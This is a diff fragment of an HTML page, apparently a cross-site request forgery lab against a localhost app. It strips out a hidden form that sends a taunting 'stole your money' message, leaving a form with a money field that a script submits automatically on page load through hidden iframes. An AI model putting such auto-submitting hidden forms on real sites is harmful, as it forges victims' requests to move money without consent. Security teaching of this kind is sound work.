@@ -22,14 +22,8 @@
     <input type="number" name="money" value="100">
 </form>
 
-<form method="post" action="http://localhost:3000/sendMessage" id="myForm2" name="myForm2" style="visibility: hidden;" target="dummyframe2">
-    <input type="text" id="to" name="to" value="dog"> 
-    <input type="number" name="message" value="HAHA I STOLE YOUR MONEY">
-</form>
-
 
 <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
-<iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
 
 <script type="text/javascript">
     window.onload=function(){
@@ -37,8 +31,6 @@
 
         function submitform(){
           document.forms["myForm"].submit();
-          document.forms["myForm2"].submit();
-
         }
 
     }
